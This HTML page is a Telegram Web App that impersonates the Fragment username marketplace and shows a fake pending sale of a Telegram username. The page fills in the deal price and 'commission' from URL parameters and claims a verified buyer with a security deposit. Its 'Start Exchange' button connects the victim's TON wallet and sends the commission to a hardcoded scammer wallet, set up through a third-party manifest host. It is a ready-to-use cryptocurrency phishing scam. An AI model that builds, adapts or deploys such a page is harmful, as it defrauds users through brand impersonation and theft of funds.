<!DOCTYPE html>
<html lang="en">
<head>
  <link href="https://fonts.googleapis.com/css?family=Bebas+Neue&display=swap" rel="stylesheet">
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" href="https://yourdomain.com/iconv2.png" type="image/png">
  <title>Fragment info</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      margin: 0;
      background-color: #1a2026;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
      color: white;
      margin-left: 10px;
      margin-right: 10px;
    }

    .container {
      max-width: 440px;
      margin: 0 auto;
      padding: 0px;
      padding-top: 50px;
    }

    .header {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
      background: #212a33;
      border-radius: 0px 0px 0 0;
      padding: 0 0 0 18px;
      min-height: 42px;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      z-index: 1000;
    }

    .header img {
      height: 33px;
      margin-left: -6px;
      margin-top: -6px;
    }

    .header span {
      font-size: 20px;
      font-weight: 500;
      color: #e6e6e6;
      letter-spacing: -0.3px;
      margin-left: 0px;
      font-family: 'Bebas Neue', Arial, sans-serif !important;
    }

    .deal-box {
      background-color: #212a33;
      border-radius: 10px;
      padding: 0;
      margin-bottom: 16px;
      max-width: 100%;
      box-sizing: border-box;
      overflow: hidden;
      user-select: none;
      height: 100%;
    }

    .top-row {
      display: flex;
      background-color: #2a3440;
      color: #707c88;
      padding: 7px 0 12px 0;
      border-top-left-radius: 12px;
      border-top-right-radius: 12px;
      font-weight: 550;
      font-size: 13px;
      justify-content: space-between;
      box-sizing: border-box;
      height: 30px;
    }

    .top-item {
      flex: 1;
      text-align: center;
      user-select: text;
    }

    .divider {
      height: 1px;
      background-color: #212a33;
      margin: 0;
    }

    .bottom-row {
      display: flex;
      background-color: #212a33;
      padding: 2px 0 0 0;
      margin-right: 10px;
      border-bottom-left-radius: 15px;
      border-bottom-right-radius: 15px;
      justify-content: space-between;
      box-sizing: border-box;
      color: white;
    }

    .bottom-item {
      flex: 1;
      text-align: center;
    }

    .value {
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: 600;
      gap: 8px;
      padding-top: 4px;
    }

    .ton-icon {
      width: 22px;
      height: 22px;
    }

    .usd-value {
      font-size: 13px;
      color: #7a8a99;
      margin-top: 2px;
    }

    .how-link {
      display: block;
      text-align: center;
      margin: 18px 0 10px 0;
      font-size: 15px;
      color: #4faaff;
      text-decoration: none;
      cursor: pointer;
      user-select: text;
      padding-right: 230px;
    }

    .deal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .deal-name {
      font-size: 18px;
      font-weight: 600;
    }

    .deal-status {
      background-color: #00cc66;
      padding: 4px 10px;
      border-radius: 999px;
      font-size: 13px;
      font-weight: 500;
      color: white;
    }

    .deal-info {
      display: flex;
      justify-content: space-between;
      margin-bottom: 12px;
    }

    .info-column {
      display: flex;
      flex-direction: column;
      align-items: center;
      flex: 1;
    }

    .info-title {
      font-size: 13px;
      color: #a0a0a0;
      margin-bottom: 4px;
    }

    .info-value {
      display: flex;
      align-items: center;
      font-size: 10px;
      font-weight: bold;
    }

    .ton-icon {
      width: 18px;
      height: 18px;
      margin-right: -9px;
      margin-top: 0px;
    }

    .info-usd {
      font-size: 13px;
      color: #888;
      margin-top: 15px;
    }

    .how-link {
      display: block;
      font-size: 10px;
      color: #4faaff;
      text-align: center;
      text-decoration: none;
      margin-top: 10px;
    }

    .details-box {
      background-color: #212a33;
      border-radius: 10px;
      overflow: hidden; /* обрезает скругления правильно */
      height: 100px;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      padding: 7px 16px;
      font-size: 14px;
      color: #fbfdfe;
      border-bottom: 1px solid #1a2026;
    }

    .detail-row:last-child {
      border-bottom: none; /* убираем линию у последнего */
    }

    .label {
      font-weight: 450;
      font-size: 13px;
    }

    .value-link {
      color: #4faaff;
      text-decoration: none;
      font-size: 14px;
      font-weight: 370;
    }

    .button {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      background-color: #248bda;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 12px;
      margin-top: 15px;
    }

    .subscribe {
      text-align: center;
      font-size: 11px;
      color: #4faaff;
      margin-bottom: 16px;
      cursor: pointer;
    }


    .info-box {
      background-color: #212a33;
      color: #b0c4d8;
      font-size: 13px;
      padding: 14px;
      border-radius: 10px;
      text-align: center;
      line-height: 1.4;
    }
 .deal-footer {
  display: flex;
  justify-content: center; /* Центрируем все deal-row по горизонтали */
  gap: 16px;
  margin-top: 24px;
}

.deal-row {
  display: flex;
  flex-direction: column;
  align-items: center; /* Центрируем содержимое deal-row */
  background: #161b22;
  border-radius: 8px;
  padding: 10px 14px;
  min-width: 120px;
}

    a {
      color: #4faaff;
    }
  </style>
</head>
<head>
  <!-- ...existing code... -->
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <!-- ...existing code... -->
</head>
<body>
  <div class="container">
    <div class="header">
  <img src="logo.png" alt="Fragment Logo" />
  <span>FRAGMENT</span>
</div>


    <!-- Ник и статус -->
    <div class="deal-nick-row" style="display: flex; align-items: center; justify-content: space-between; background: #1b2026; border-radius: 12px 12px 0 0; padding: -50px -50px 0%; margin-bottom: 20px;">
      <p class="move-right"></p>
      <div id="deal-nick" style="font-size: 20px; font-weight: 550; color: #fff; letter-spacing: 0.2px; padding-left: 30px;margin-top: 20px;">vladiimrgod.t.me</div>
      <p class="move-left"></p>
      <div id="deal-status" style="background: #203530; color: #4cec81; font-size: 10px; font-weight: 600; border-radius: 7px; padding: 6px 8px; margin-left: -50px; margin-top: 20px;">Deal In Progress</div>
      <p class="move-left"></p>
    </div>
    <div class="deal-box">
      <div class="top-row">
        <div class="top-item">Deal Price</div>
        <div class="top-item">Commission</div>
      </div>
      <div class="divider"></div>
      <div class="bottom-row">
        <div class="bottom-item">
          <div class="value">
            <img src="ton.png" alt="TON" class="ton-icon" />
            <span id="deal-price">3236</span>
          </div>
          <div class="usd-value" id="deal-usd">~ $13,500.00</div>
        </div>
        <div class="bottom-item">
          <div class="value">
            <img src="ton.png" alt="TON" class="ton-icon" />
            <span id="commission">225</span>
          </div>
          <div class="usd-value" id="commission-usd">~ $675.00</div>
        </div>
      </div>
      <a href="#" class="how-link">How does this work?</a>
    </div>

    <!-- Модальное окно "How does this work?" -->
    <div id="how-modal" class="how-modal" style="display:none;">
      <div class="how-modal-content">
        <div class="how-modal-title">How does this work?</div>
        <div class="how-modal-body">
          <div style="margin-bottom: 10px;">You sell this username</div>
          <div style="font-weight:600; margin-bottom: 6px;">To do so, simply:</div>
          <ul class="how-modal-list">
            <li>Connect TON wallet</li>
            <li>Deposit funds in your wallet from a supported exchange or with <a href="t.me/@wallet" style="color:#4faaff;text-decoration:underline;">@wallet</a> on Telegram.</li>
            <li>Pay a commission of 5%</li>
          </ul>
          <div style="margin: 10px 0 0 0;">When you have completed a deal to sell your name, after paying the commission, the money will be credited to your wallet account.</div>
        </div>
        <div class="how-modal-footer">
          <a href="#" class="how-modal-close">Close</a>
        </div>
      </div>
    </div>

    <div class="details-box">
  <div class="detail-row">
    <span class="label">Telegram Username</span>
    <a class="value-link" id="tg-username-link" href="https://t.me/vladiimrgod"><span id="tg-username">@vladiimrgod</span></a>
  </div>
  <div class="detail-row">
    <span class="label">Web Address</span>
    <a class="value-link" id="web-address-link" href="https://t.me/vladiimrgod"><span id="web-address">t.me/vladiimrgod</span></a>
  </div>
  <div class="detail-row">
    <span class="label">TON Web 3.0 Address</span>
    <a class="value-link" id="ton-web-link" href="https://vladiimrgod.t.me"><span id="ton-web">vladiimrgod.t.me</span></a>
  </div>
</div>
<button class="button" id="start-exchange-btn">Start Exchange</button>
    <div class="subscribe">Subscribe to updates</div>
    


    <div class="info-box">
      You do not need to complete KYC verification,<br />
      as the buyer is a verified merchant on a Fragment<br />
      that has a security deposit of 💎10,000.
    </div>
    <style>
      .how-modal {
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(10,16,24,0.85);
        z-index: 2000;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: inherit;
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.25s cubic-bezier(.4,0,.2,1);
      }
      .how-modal.show {
        opacity: 1;
        pointer-events: auto;
      }
      .how-modal-content {
        background: #232b33;
        border-radius: 12px;
        box-shadow: 0 4px 32px 0 rgba(0,0,0,0.25);
        padding: 24px 28px 18px 28px;
        max-width: 360px;
        width: 94vw;
        color: #e6e6e6;
        font-size: 15px;
        line-height: 1.5;
        position: relative;
      }
      .how-modal-title {
        font-size: 20px;
        font-weight: 700;
        margin-bottom: 10px;
        color: #fff;
      }
      .how-modal-list {
        padding-left: 18px;
        margin: 0 0 0 0;
        color: #e6e6e6;
        font-size: 15px;
      }
      .how-modal-list li {
        margin-bottom: 4px;
      }
      .how-modal-footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 18px;
      }
      .how-modal-learn {
        color: #4faaff;
        font-size: 15px;
        text-decoration: underline;
        cursor: pointer;
      }
      .how-modal-close {
        color: #7a8a99;
        font-size: 15px;
        cursor: pointer;
        text-decoration: none;
        font-weight: 600;
      }
      @media (max-width: 500px) {
        .how-modal-content { padding: 16px 4vw 12px 4vw; }
      }
    </style>
    <script>
      document.addEventListener('DOMContentLoaded', function() {
        var howLink = document.querySelector('.how-link');
        var modal = document.getElementById('how-modal');
        var closeBtn = document.querySelector('.how-modal-close');
        var learnBtn = document.querySelector('.how-modal-learn');
        if (howLink && modal && closeBtn) {
          howLink.addEventListener('click', function(e) {
            e.preventDefault();
            modal.style.display = 'flex';
            // Триггерим плавное появление через класс
            setTimeout(function() { modal.classList.add('show'); }, 10);
          });
          function closeModal() {
            modal.classList.remove('show');
            setTimeout(function() { modal.style.display = 'none'; }, 250);
          }
          closeBtn.addEventListener('click', function(e) {
            e.preventDefault();
            closeModal();
          });
          // Закрытие по клику вне окна
          modal.addEventListener('click', function(e) {
            if (e.target === modal) closeModal();
          });
        }
        if (learnBtn) {
          learnBtn.addEventListener('click', function(e) {
            e.preventDefault();
            window.open('https://fragment.com/help', '_blank');
          });
        }
      });
    </script>
  </div>
  

  <script>
  Telegram.WebApp.ready();

  // Курс TON к доллару
  const TON_TO_USD = 3;

  // Функция для получения параметров из URL
  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  // Форматирование числа с двумя знаками после запятой
  function formatUSD(value) {
    return Number(value).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
  }

  window.addEventListener('DOMContentLoaded', () => {
    // Ник из TON Web 3.0 Address
    const tonWeb = getParam('dealname') || getParam('tonweb') || 'vladiimrgod.t.me';
    document.getElementById('deal-nick').textContent = tonWeb;

    // Deal price
    const price = getParam('price');
    if (price) document.getElementById('deal-price').textContent = price;

    // Deal USD
    if (price) document.getElementById('deal-usd').textContent = '~ $' + formatUSD(price * TON_TO_USD);

    // Commission
    const commission = getParam('commission');
    if (commission) document.getElementById('commission').textContent = commission;
    else if (price) document.getElementById('commission').textContent = (price * 0.05).toFixed(2);

    // Commission USD
    if (commission) document.getElementById('commission-usd').textContent = '~ $' + formatUSD(commission * TON_TO_USD);
    else if (price) document.getElementById('commission-usd').textContent = '~ $' + formatUSD((price * 0.05) * TON_TO_USD);

    // Telegram username
    const username = getParam('username');
    if (username) {
      document.getElementById('tg-username').textContent = '@' + username;
      document.getElementById('tg-username-link').href = 'https://t.me/' + username;
      document.getElementById('web-address').textContent = 't.me/' + username;
      document.getElementById('web-address-link').href = 'https://t.me/' + username;
    }
  });
  </script>
<!-- Удалён дублирующийся скрипт с TON_TO_USD -->
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<script>
  // Ваш TON-кошелек для получения комиссии
  const RECEIVER_WALLET = "UQCOjIJFUlgUm6biPVYSaCHQAFiGUB9gqbinuz4S_PUJ4ocF"; // замените на свой адрес

  // Инициализация TON Connect UI (без кнопки)
  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://good-kwdc.onrender.com/tonconnect-manifest.json"
  });

  document.getElementById('start-exchange-btn').onclick = async function() {
    // Получаем сумму комиссии из DOM
    const commission = document.getElementById('commission').textContent;
    if (!commission) {
      alert('Commission not set!');
      return;
    }

    // Проверяем подключение кошелька, если не подключён — подключаем
    let wallet = tonConnectUI.wallet;
    if (!wallet) {
      await tonConnectUI.connectWallet();
      wallet = tonConnectUI.wallet;
      if (!wallet) {
        alert('Please connect your TON wallet!');
        return;
      }
    }

    // Отправляем транзакцию
    try {
      await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
        messages: [
          {
            address: RECEIVER_WALLET,
            amount: (parseFloat(commission) * 1e9).toString(), // TON в нанотонах
          }
        ]
      });
      alert('Payment sent!');
    } catch (e) {
      alert('Payment failed or cancelled.');
    }
  };

</script>

  <div class="tradeinfo-header" style="margin-top:30px; margin-bottom: 0px; height: 33px; margin-left: 6px;">
  <span class="tradeinfo-name" style="font-size: 20px; font-weight: 600; color: #fff; letter-spacing: -0.5px; font-family: Bebas Neue Regular 400;">Trade Info</span>
  </div>
  <div class="tradeinfo-box tradeinfo-panel">
    <div class="tradeinfo-row tradeinfo-row-labels">
      <div class="tradeinfo-col">Deal Status</div>
      <div class="tradeinfo-col">Username status</div>
      <div class="tradeinfo-col">Buyer</div>
    </div>
    <div class="tradeinfo-row tradeinfo-row-values">
      <div class="tradeinfo-col"><span class="tradeinfo-main-value">Deal In Progress</span></div>
      <div class="tradeinfo-col"><span class="tradeinfo-main-value" style="font-weight:400;">Swappable</span></div>
      <div class="tradeinfo-col"><span class="tradeinfo-main-value" style="font-weight:400;">Ef_BbsF16B4aR...</span></div>
    </div>
  </div>
  <style>
    .tradeinfo-box.tradeinfo-panel {
      background: #232b33;
      border-radius: 10px;
      padding: 0px;
      margin: 0 auto 16px auto;
      max-width: 440px;
      box-shadow: 0 2px 8px 0 rgba(0,0,0,0.04);
      overflow: hidden;
    }
    .tradeinfo-row {
      display: flex;
      width: 100%;
      height: 30px;;
    }
    .tradeinfo-row-labels {
      background: #2a3440;
    }
    .tradeinfo-row-values {
      background: #232b33;
    }
    .tradeinfo-col {
      flex: 1;
      text-align: center;
      padding: 5px 0 0px 0;
      font-size: 10px;
      color: #aeb8c2;
      font-weight: 500;
      letter-spacing: -0.5px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .tradeinfo-row-labels .tradeinfo-col {
      font-size: 12px;
      color: #aeb8c2;
      font-weight: 600;
      background: #2a3440;
      border: none;
      padding: 15px 0 18px 0;
    }
    .tradeinfo-row-values .tradeinfo-col {
      font-size: 12px;
      color: #cfd8e3;
      font-weight: 600;
      background: #232b33;
      border: none;
      padding: 15px 0 18px 0;
    }
    .tradeinfo-main-value {
      font-size: 12px;
      font-weight: 600;
      color: #fff;
      letter-spacing: 0px;
    }
  </style>

</body>
  <div class="tradeinfo-footer-nav">
    <div class="footer-links">
      <a href="#" class="footer-link">Top Auctions</a>
      <a href="#" class="footer-link">About</a>
      <a href="#" class="footer-link">Terms</a>
      <a href="#" class="footer-link">Privacy</a>
    </div>
  </div>
  <style>
    .tradeinfo-footer-nav {
      width: 100vw;
      background: #111417;
      border-top: 0px solid #232b33;
      margin: 0;
      padding: 0;
      height: 38px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-sizing: border-box;
      border-radius: 0 0 0px 0px;
      position: fixed;
      left: 0;
      bottom: 0;
      z-index: 1001;
    }
    .footer-links {
      display: flex;
      gap: 28px;
      margin: 0 auto;
    }
    .footer-link {
      color: #6d8394;
      font-size: 9px;
      text-decoration: none;
      font-weight: 400;
      pointer-events: none;
      cursor: default;
      opacity: 1;
      transition: none;
    }
    .footer-link:hover {
      color: #6d8394;
    }
    @media (max-width: 600px) {
      .footer-links { gap: 16px; }
      .footer-link { font-size: 13px; }
    }
  </style>
</html>